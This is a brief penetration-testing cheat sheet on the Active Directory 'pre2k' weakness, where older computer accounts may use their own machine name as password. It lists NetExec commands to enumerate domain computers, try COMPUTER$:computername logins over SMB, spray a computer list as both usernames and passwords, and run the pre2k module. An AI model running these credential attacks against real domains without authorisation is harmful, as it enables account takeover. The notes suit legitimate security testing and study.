# pre2k

## What “pre2k” actually means

In Active Directory environments, older compatibility settings allow:

> Computer accounts to authenticate using **just the machine name as both username and password**
> 

## 🔑 Example

If a machine is:

```
WEB01
```

Then the default credential pattern might be:

```text
<COMPUTER_NAME>$ : <computer_name>
```

Yes — literally that simple.

## ENUM

```powershell
nxc ldap <DC_IP> -u pentest -p '<PASSWORD>' --computers
```

### 2. Try authentication

For each computer:

```
nxc smb <TARGET_IP> -u '<COMPUTER_NAME>$' -p '<computer_name>'
```

Or automate:

```
nxc smb <TARGET_IP> -u computers.txt -p computers.txt
```

### Use the built-in module

You already saw this in your tool list:

```
pre2k
```

So just run:

```
nxc ldap <DC_IP> -u pentest -p '<PASSWORD>' -M pre2k
```